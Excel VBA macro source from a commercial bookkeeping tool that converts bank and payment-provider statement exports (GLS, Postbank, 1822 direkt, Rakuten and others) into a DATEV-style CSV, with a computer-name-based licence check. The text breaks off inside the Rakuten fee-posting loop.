Attribute VB_Name = "DUO"
Sub DUO()

Dim Bereich As Object, Zeile As Object, Zelle As Object
Dim strTemp As String
Const Trennzeichen As String = ";"

Sheets("Tabelle").Select
x = ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row


Sheets("DUO").Cells(1, 1) = "W|fffd|hrung"
Sheets("DUO").Cells(1, 2) = "VorzBetrag"
Sheets("DUO").Cells(1, 3) = "RechNr"
Sheets("DUO").Cells(1, 4) = "BelegDatum"
Sheets("DUO").Cells(1, 5) = "Belegtext"
Sheets("DUO").Cells(1, 6) = "UStSatz"
Sheets("DUO").Cells(1, 7) = "BU"
Sheets("DUO").Cells(1, 8) = "Gegenkonto"
Sheets("DUO").Cells(1, 9) = "Kost1"
Sheets("DUO").Cells(1, 10) = "Kost2"
Sheets("DUO").Cells(1, 11) = "Kostmenge"
Sheets("DUO").Cells(1, 12) = "Skonto"
Sheets("DUO").Cells(1, 13) = "Nachricht"

For zeile1 = 2 To x
Text = ""
Sheets("DUO").Cells(zeile1 + 1, 1) = "EUR" '"W|fffd|hrung"
betrag = Sheets("Tabelle").Cells(zeile1, 7)
betrag = Format(betrag, "###0.##")

Sheets("DUO").Cells(zeile1 + 1, 2) = betrag '"VorzBetrag"
Sheets("DUO").Cells(zeile1 + 1, 3) = "" '"RechNr"
belegdatum = Left(Sheets("Tabelle").Cells(zeile1, 6), 2) & Mid(Sheets("Tabelle").Cells(zeile1, 6), 4, 2) '"BelegDatum"
Sheets("DUO").Cells(zeile1 + 1, 4) = belegdatum
For x1 = 8 To 16
   Text = Text & Cells(zeile1, x1)
Next x1
Text = Left(Text, 30)

Sheets("DUO").Cells(zeile1 + 1, 5) = Text '"Belegtext"
Sheets("DUO").Cells(zeile1 + 1, 6) = "" '"UStSatz"
Sheets("DUO").Cells(zeile1 + 1, 7) = "" '"BU"
Sheets("DUO").Cells(zeile1 + 1, 8) = "" '"Gegenkonto"
Sheets("DUO").Cells(zeile1 + 1, 9) = "" '"Kost1"
Sheets("DUO").Cells(zeile1 + 1, 10) = "" '"Kost2"
Sheets("DUO").Cells(zeile1 + 1, 11) = "" '"Kostmenge"
Sheets("DUO").Cells(zeile1 + 1, 12) = "" '"Skonto"
Sheets("DUO").Cells(zeile1 + 1, 13) = "" '"Nachricht"
If zeile1 = 175 Then
'Beep
End If
Next zeile1





Dateischreiben:
Sheets("DUO").Select
Set Bereich = ActiveSheet.Range("A1:M" & x)


 filesavename = Application.GetSaveAsFilename( _
    fileFilter:="Text csv (*.csv), *.csv")
    
  Open filesavename For Output As #1

  ' im text d|fffd|rfen au|fffd|er den Trennzeichen keine Semikolon sein, vorher l|fffd|schen!
 '  Workbooks(macrodatei).Activate
   Sheets("DUO").Activate
   Cells.Replace What:=";", Replacement:=" ", LookAt:=xlPart, SearchOrder _
        :=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False


   
   For zeilen = 1 To x
    
    For spalte = 1 To 13  '13 spalten m|fffd|ssen da sein.
       
       'If spalte = 5 Or spalte = 6 Or spalte = 7 Then 'in bestimmten Spalten keine Anf|fffd|hrungsstriche
       '  strtemp1 = strtemp1 & Cells(zeilen, spalte) & ";"
                     
       'mit semikolon vorn und hinten
         strtemp1 = strtemp1 & """" & Cells(zeilen, spalte).Text & """" & ";"

       
       If strtemp1 = "" Then Exit For
    Next spalte
    strtemp1 = Left(strtemp1, Len(strtemp1) - 1)
    Print #1, strtemp1
    strtemp1 = ""
   Next zeilen

  Close #1
  
  
  Set Bereich = Nothing

ActiveWorkbook.Save
Application.DisplayAlerts = True

End Sub

Attribute VB_Name = "DieseArbeitsmappe"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()

Sheets("1").Activate
Sheets("1").Select
End Sub
Attribute VB_Name = "GLS"
Sub GLS2019()


'GLS |fffd|nderung 2019
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): EndeLL = 1: Exit Sub
   Workbooks.Open Filename:=fremdprogramm, Local:=True
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
    ' Plus und Minus ersetzen
    Columns("C:J").Select
    Selection.Replace What:="+", Replacement:=" ", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="-", Replacement:=" ", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    
    x = Workbooks(fremdprogrammDatei).Sheets(1).UsedRange.SpecialCells(xlCellTypeLastCell).Row
        For zeile1 = 10 To x
                 datum = Cells(zeile1, 1)
                 If IsNumeric(Left(datum, 4)) Then   'GoTo glsNaechstZeile  'machmal geht es erst in der 11. Zeile los.
                 If Cells(zeile1, 10) <> "Anfangssaldo" Then
                 If Cells(zeile1, 10) <> "Endsaldo" Then
                 
                 betrag = Cells(zeile1, 12)
                 If Cells(zeile1, 13) = "S" Then betrag = -betrag
                IbanAuftraggeber = Cells(zeile1, 6)
                'transaktionstyp = Cells(zeile1, 9)
                Text = Cells(zeile1, 9)
                Text = Replace(Text, Chr(10), " ")
                Text = Replace(Text, Chr(13), " ")
                                
                vwz1 = Left(Text, 27)
                vwz2 = Mid(Text, 28, 27)
                vwz3 = Mid(Text, 54, 27)
                vwz4 = Mid(Text, 81, 27)
                vwz5 = Mid(Text, 108, 27)
                vwz6 = Mid(Text, 135, 27)
                vwz7 = Mid(Text, 162, 27)
                vwz9 = Mid(Text, 189, 27)
                vwz10 = Mid(Text, 216, 27)
                      
                
                empfaenger1 = Left(Cells(zeile1, 6), 27)
                empfaenger2 = Mid(Cells(zeile1, 6), 28, 27)

                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger1, 1) = "-" Or Left(empfaenger1, 1) = "+" Then empfaenger1 = " " & empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                If Left(empfaenger2, 1) = "-" Or Left(empfaenger2, 1) = "+" Then empfaenger2 = " " & empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""
glsNaechstZeile:
              End If 'endsaldo Zeile
              End If 'Anfangssaldo Zeile
              End If 'isnumeric
              Next zeile1
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
 Workbooks(macrodatei).Activate

'####################################################################


End Sub
Attribute VB_Name = "Modul1"
Sub Makro1()
Attribute Makro1.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Makro1 Makro
'

'
    Workbooks.Open Filename:= _
        "C:\Users\rs\Desktop\Makrosammlung\bank2datev\original kontoauszug penta.csv"
    Columns("A:A").Select
    Selection.TextToColumns Destination:=Range("A1"), DataType:=xlDelimited, _
        TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=False, _
        Semicolon:=False, Comma:=True, Space:=False, Other:=False, FieldInfo _
        :=Array(Array(1, 1), Array(2, 1), Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), _
        Array(7, 1), Array(8, 1), Array(9, 1), Array(10, 1), Array(11, 1), Array(12, 1), Array(13, 1 _
        ), Array(14, 1), Array(15, 1), Array(16, 1), Array(17, 1), Array(18, 1), Array(19, 1), Array _
        (20, 1), Array(21, 1), Array(22, 1), Array(23, 1)), TrailingMinusNumbers:=True
End Sub
Attribute VB_Name = "N26_Programm"
Public mandantendatei As String
Public EndeLL As Long 'ganzzahl
Public Version As String
Public macrodatei As String
Public bankleitzahl As String
Public Kontonummer As String
Public fremdprogramm As String
Public bank As String
Public max As Long
Dim zelle2 As Object
Dim AssDateLastRow As Long
Public x As Long
Sub N26()
' Dieses Programm ist urheberrechtlich gesch|fffd|tzt: SBCO GmbH, D|fffd|sseldorf 0211-30 20 14 71
' Bei unbefugter Weitergabe des Programms wird eine Vertragsstrafe von EUR 5.000 f|fffd|llig.

Dim Bereich As Object, Zeile As Object, Zelle As Object
Dim strTemp As String
Const Trennzeichen As String = ";"

Dim r As Range
Dim letzteZeile As Long
Dim letzteZelle As Range
Sheets("1").Select
Cells(27, 1) = Environ("COMPUTERNAME")
a = "Der Lizenzschl|fffd|ssel ist nicht korrekt. Bitte kontaktieren Sie www.sbco.cloud, um die Lizenz zu verl|fffd|ngern."
b = "Ihre Lizenz ist abgelaufen. Bitte kontaktieren Sie www.sbco.cloud, um die Lizenz zu verl|fffd|ngern."
c = "Fehlender Lizenzcode. Bitte f|fffd|ge deinen Lizenzcode in die Zelle B9 ein!"
k = Cells(9, 2)
If k = "" Then MsgBox (c)
p = Environ("COMPUTERNAME")
For x = 1 To Len(p)
    n = Asc(Mid(p, x, 1))
    y = y & n & ","
Next x
lstelle = InStr(1, k, "L")
KeyI = "L" & y & Right(k, 5)
KeyI = Left(k, lstelle - 1) & KeyI
'------------------------------
'Version lesen
For x = 1 To lstelle - 1
Text = (Mid(k, x, 1))
         If Text = "," Then
             Zeichen = Chr(Val(text1))
             Version = Version & Zeichen
             text1 = ""
         Else
             text1 = text1 & Text
         End If

        
Next x
If Version = "Bank S" Then max = 25
If Version = "Bank L" Then max = 501
If Version = "Bank XL" Then max = 5001


Cells(26, 1) = Version
Cells(27, 1) = Environ("COMPUTERNAME")


'quersumme_testen
For intCounter = 2 To Len(CStr(KeyI))
  qsI = qsI + Val(Mid(CStr(KeyI), intCounter, 1))
Next
  qsI = Val(Right(qsI, 2))

qsS = Val(Mid(Cells(9, 2), lstelle + 1, 2))
If qsI <> qsS Then
MsgBox (a): GoTo endeL
End If

'datum testen
datum = Right(Cells(9, 2), 5)
enddatum = CDate(datum)
  
 If Date > CDate(enddatum) Then
    MsgBox (b): GoTo endeL
Else

Sheets("Tabelle").Select
   Columns("A:CK").Select
    Selection.ClearContents

macrodatei = ActiveWorkbook.Name

mandantenname = Sheets("1").Cells(8, 1)
bankleitzahl = Sheets("1").Cells(8, 3)
Kontonummer = Sheets("1").Cells(8, 2)
bank = Sheets("1").Cells(8, 4)
'fremdprogrammDatei |fffd|ffenen

If fremdprogramm = "" Then
fremdprogramm = Application.GetOpenFilename("Bankdatei (*.*), *.*", , "Bank-Datei |fffd|ffnen")
End If


'####   Daten einlesen
If bank = "Stripe" Then
   Call stripe
   If EndeLL = 1 Then GoTo endeL
End If

If bank = "GLS Bank 2019" Or bank = "Volksbank" Then
   Call GLS2019
   If EndeLL = 1 Then GoTo endeL
End If
If bank = "Targobank" Then
   Call Targobank
   If EndeLL = 1 Then GoTo endeL
End If
If bank = "AmazonPay" Then
   Call AmazonPay
   If EndeLL = 1 Then GoTo endeL
End If
If bank = "Fidor" Then
   Call fidor
   If EndeLL = 1 Then GoTo endeL
End If
If bank = "Penta1" Then
   Call penta1
   If EndeLL = 1 Then GoTo endeL
End If
If bank = "Sparkasse" Then
   Call sparkasse
   If EndeLL = 1 Then GoTo endeL
End If

If bank = "Revolut" Then
   Call revolut
   If EndeLL = 1 Then GoTo endeL
End If

If bank = "Revolut1" Then
   Call revolut1
   If EndeLL = 1 Then GoTo endeL
End If
If bank = "Revolut" Then
   'Call revolut
   If EndeLL = 1 Then GoTo endeL
End If

'1822

If bank = "1822 direkt" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
   Workbooks.Open Filename:=fremdprogramm, Local:=True
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
     x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
       For zeile1 = 2 To x
                datum = Cells(zeile1, 3)
                betrag = Cells(zeile1, 5)          '
                IbanAuftraggeber = Cells(zeile1, 9)
                transaktionstyp = Cells(zeile1, 7)
                
                vwz1 = Cells(zeile1, 14)
                vwz2 = Cells(zeile1, 15)
                vwz3 = Cells(zeile1, 16)
                vwz4 = Cells(zeile1, 17)
                vwz5 = Cells(zeile1, 18)
                vwz6 = Cells(zeile1, 19)
                vwz7 = Cells(zeile1, 20)
                vwz9 = Cells(zeile1, 21)
                vwz10 = Cells(zeile1, 22)
                      
                empfaenger1 = Left(Cells(zeile1, 8), 27)
                empfaenger2 = Mid(Cells(zeile1, 8), 28, 27)

                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                If Left(empfaenger1, 1) = "-" Or Left(empfaenger1, 1) = "+" Then empfaenger1 = " " & empfaenger1
                If Left(empfaenger2, 1) = "-" Or Left(empfaenger2, 1) = "+" Then empfaenger2 = " " & empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""
              Next zeile1
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
  Workbooks(macrodatei).Activate
  End If    '1822


'Postbank
If bank = "Postbank" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
   Workbooks.Open Filename:=fremdprogramm, Local:=True
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
    x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
       For zeile1 = 10 To x
                 datum = Cells(zeile1, 1)
                 If Left(datum, 4) = "Buch" Then GoTo PostNaechstZeile 'machmal geht es erst in der 11. Zeile los.
                 If Left(datum, 8) = "gebuchte" Then GoTo PostNaechstZeile    '28.10.2019
                 betrag = Cells(zeile1, 7)          '
                'IbanAuftraggeber = Cells(zeile1, 6)
                transaktionstyp = Cells(zeile1, 3)
                Text = Cells(zeile1, 4)
                If Left(Text, 9) = "Referenz " Then Text = Right(Text, Len(Text) - 9)
                If Left(Text, 12) = "NOTPROVIDED " Then Text = Right(Text, Len(Text) - 12)
                vwz1 = Left(Text, 27)
                vwz2 = Mid(Text, 28, 27)
                vwz3 = Mid(Text, 54, 27)
                vwz4 = Mid(Text, 81, 27)
                vwz5 = Mid(Text, 108, 27)
                vwz6 = Mid(Text, 135, 27)
                vwz7 = Mid(Text, 162, 27)
                vwz9 = Mid(Text, 189, 27)
                vwz10 = Mid(Text, 216, 27)
                      
                empfaenger = Cells(zeile1, 6)
                If betrag > 0 Then empfaenger = Cells(zeile1, 5)

                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""
PostNaechstZeile:
              Next zeile1
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
 Workbooks(macrodatei).Activate
 End If    'Postbank
'####################################################################


'GLS
If bank = "GLS Bank" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
   Workbooks.Open Filename:=fremdprogramm, Local:=True
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
     x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
       For zeile1 = 2 To x
                datum = Cells(zeile1, 2)
                 betrag = Cells(zeile1, 20)          '
                'IbanAuftraggeber = Cells(zeile1, 6)
                transaktionstyp = Cells(zeile1, 5)
                vwz1 = Cells(zeile1, 6)
                vwz2 = Cells(zeile1, 7)
                vwz3 = Cells(zeile1, 8)
                vwz4 = Cells(zeile1, 9)
                vwz5 = Cells(zeile1, 10)
                vwz6 = Cells(zeile1, 11)
                vwz7 = Cells(zeile1, 12)
                vwz9 = Cells(zeile1, 13)
                vwz10 = Cells(zeile1, 14)
                empfaenger = Cells(zeile1, 4)

                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""
              Next zeile1
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
  Workbooks(macrodatei).Activate
  End If    'GLS

'#################################################################
If bank = "Rakuten" Then
         If Version <> "Rakuten" Then MsgBox ("Du hast keine Rakuten-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
                 
         Application.ScreenUpdating = False
         Workbooks.Open Filename:= _
         fremdprogramm, Local:=True
         Application.Workbooks.OpenText Filename:=fremdprogramm, DataType:=xlDelimited, Semicolon:=True, Local:=True
     
    
       mandantendatei = ActiveWorkbook.Name
       letzteZeile = Workbooks(mandantendatei).Sheets(1).UsedRange.SpecialCells(xlCellTypeLastCell).Row
       
    Columns("F:F").Select
    Selection.Replace What:="=-", Replacement:="", LookAt:=xlPart, _
    SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
    ReplaceFormat:=False
     
    Application.ScreenUpdating = False
    outputzeile = 2
 Rem Mandantendatei lesen
  For zeile1 = 2 To letzteZeile
      textzeile = 1
      leer = 0
    '  Zeile1 = 99
       Application.StatusBar = "Bearbeite Zeile " & zeile1 & " von " & letzteZeile
       Workbooks(mandantendatei).Activate
       
       datum = Cells(zeile1, 2)
       If datum = "" Then GoTo endeR
       betrag = Cells(zeile1, 7)
       If betrag = "" Then GoTo nachsteZeileR
       
       gebuehr = Cells(zeile1, 9)
       'transaktionstyp = Cells(zeile1, 11)  'description
       empfaenger1 = Left(Cells(zeile1, 6), 27)
       empfaenger2 = Mid(Cells(zeile1, 6), 27, 27)
       'IbanAuftraggeber = Cells(zeile1, 6)
      
       vwz1 = Left(Cells(zeile1, 3), 27)
       vwz2 = Left(Cells(zeile1, 18), 27)
       vwz3 = Left(Cells(zeile1, 19), 27)
       vwz4 = Left(Cells(zeile1, 20), 27)

       vwz5 = Left(Cells(zeile1, 21), 27)
       vwz6 = Left(Cells(zeile1, 22), 27)
       vwz7 = Left(Cells(zeile1, 23), 27)

       
                
             '   betrag = Cells(zeile1, 16) + Cells(zeile1, 17)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 7) = betrag
                If Left(empfaenger1, 1) = "-" Or Left(empfaenger1, 1) = "+" Then empfaenger1 = " " & empfaenger1
                If Left(empfaenger2, 1) = "-" Or Left(empfaenger2, 1) = "+" Then empfaenger2 = " " & empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 8) = empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 9) = empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 15) = vwz4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 24) = vwz10
                                                                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 18) = transaktionstyp
                outputzeile = outputzeile + 1
      
       'Geb|fffd|hrenbuchungssatz
       If gebuehr = "..." Then GoTo nachsteZeileR
       
       
       If gebuehr <> "" Then
             If CDbl(gebuehr) > 0 Then
                betrag = -CDbl(gebuehr)
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 7) = betrag
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 8) = "Rakuten Fee" 'empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 15) = vwz4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 21) = vwz7
